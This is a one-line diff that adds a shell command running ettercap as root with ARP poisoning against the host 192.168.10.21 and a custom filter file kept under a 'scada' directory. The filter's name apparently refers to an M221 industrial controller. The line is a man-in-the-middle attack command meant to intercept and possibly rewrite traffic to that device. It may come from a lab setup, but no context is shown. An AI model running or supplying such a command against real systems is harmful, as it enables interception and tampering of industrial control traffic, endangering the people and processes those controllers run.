@@ -1,0 +1,1 @@
+sudo ettercap -T -q -F /home/pi/scada/memo/m221_3.ef -M ARP /192.168.10.21//
